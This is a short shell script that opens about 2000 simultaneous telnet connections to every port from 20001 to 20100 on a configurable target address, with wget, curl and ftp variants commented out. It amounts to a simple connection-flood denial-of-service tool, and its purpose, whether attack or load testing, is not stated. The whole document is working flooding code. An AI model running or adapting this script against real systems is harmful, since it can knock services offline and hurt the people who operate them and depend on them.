#! /bin/sh

# the address targeted
URL=
# the range of port to target
PORTMIN=20001
PORTMAX=20100
# number of connections
TRIES=1
# simultanous
NBR_SIMUL=2000
SIMUL=$(for ((i=1;i<=$NBR_SIMUL;i++)) ; do (echo -ne ". ") ; done)

for ((PORT=$PORTMIN;PORT<=$PORTMAX;PORT++))
do
    for ((i=1;i<=$TRIES;i++))
    do
        echo $i $URL $PORT
        for i in $SIMUL ; do (echo "" | telnet $URL $PORT &) ;done
        #wget $URL:$PORT
        #curl $URL:$PORT
        #ftp
    done
done